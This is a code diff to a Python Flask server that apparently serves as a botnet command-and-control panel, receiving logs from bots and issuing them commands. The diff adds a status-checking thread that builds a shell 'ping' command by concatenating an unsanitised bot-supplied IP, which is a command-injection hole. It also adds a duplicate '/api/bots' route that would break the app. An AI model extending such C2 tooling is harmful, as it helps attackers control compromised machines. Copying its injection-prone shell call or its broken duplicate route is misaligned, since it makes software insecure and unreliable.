@@ -128,6 +128,27 @@ def receive_log(bot_id):
     logger.info(f"[BOT LOG - {bot_id}] {log_entry}")
     return jsonify({'status': 'ok'})
 
+def check_bot_statuses():
+    while True:
+        for bot_id, bot_data in list(bots.items()):
+            if time.time() - bot_data.get('last_seen', 0) > 60:
+                # Bot is offline from C2 perspective, check public IP
+                if bot_data.get('public_ip'):
+                    response = os.system("ping -c 1 " + bot_data['public_ip'])
+                    if response == 0:
+                        bots[bot_id]['status'] = 'yellow'
+                    else:
+                        bots[bot_id]['status'] = 'red'
+                else:
+                    bots[bot_id]['status'] = 'red' # No public IP to check
+            else:
+                bots[bot_id]['status'] = 'green'
+        time.sleep(30)
+
+@app.route('/api/bots')
+def get_bots():
+    return jsonify(bots)
+
 @app.route('/api/bots')
 def get_bots():
     return jsonify(bots)
@@ -167,6 +188,11 @@ def issue_command():
     print(f"Command issued to bot {bot_id}.")
 
 def main():
+    # Start status checking thread
+    status_thread = threading.Thread(target=check_bot_statuses)
+    status_thread.daemon = True
+    status_thread.start()
+
     # Start Flask server in a separate thread
     flask_thread = threading.Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5000})
     flask_thread.daemon = True
